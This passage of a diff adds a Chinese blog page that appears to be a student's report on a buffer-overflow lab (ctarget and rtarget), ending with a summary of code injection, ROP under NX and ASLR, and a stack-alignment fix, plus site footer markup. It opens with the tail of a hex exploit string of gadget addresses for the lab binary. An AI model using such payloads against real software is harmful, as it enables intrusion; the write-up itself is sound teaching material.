1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="实验总结">实验总结</h2>
+<p>本次实验通过 5 个关卡深入理解了缓冲区溢出攻击的原理。</p>
+<ol>
+<li><strong>栈结构理解</strong>：在 Code Injection 阶段，深刻体会了返回地址在栈上的位置以及如何计算偏移量。</li>
+<li><strong>系统保护机制</strong>：在 <code>rtarget</code> 中遭遇了 NX 和 ASLR，迫使我放弃注入代码，转而寻找现有的 Gadget，通过 ROP 技术完成任务。</li>
+<li><strong>环境兼容性</strong>：在 <code>ctarget</code> Level 2/3 中，遇到了 Ubuntu 24.04 对栈对齐的检查导致的 Segfault。通过利用 <code>push $addr; ret</code> 代替直接跳转，成功利用 <code>push</code> 对 <code>%rsp</code> 的修改修复了栈对齐问题。</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/" rel="tag"># 计算机</a>
+              <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/" rel="tag"># 计算机系统基础</a>
+              <a href="/tags/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/" rel="tag"># 实验报告</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/11/23/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6%E4%BD%9C%E4%B8%9A-20251123-%E7%AC%AC%E4%B9%9D%E7%AB%A0-2/" rel="prev" title="离散数学作业-20251123-第九章(2)">
+                  <i class="fa fa-angle-left"></i> 离散数学作业-20251123-第九章(2)
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/11/28/%E5%87%BD%E6%95%B0%E7%BB%BC%E5%90%88%E5%8F%8D%E5%A4%8D%E7%BB%832/" rel="next" title="函数综合反复练2">
+                  函数综合反复练2 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Sunglassman</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
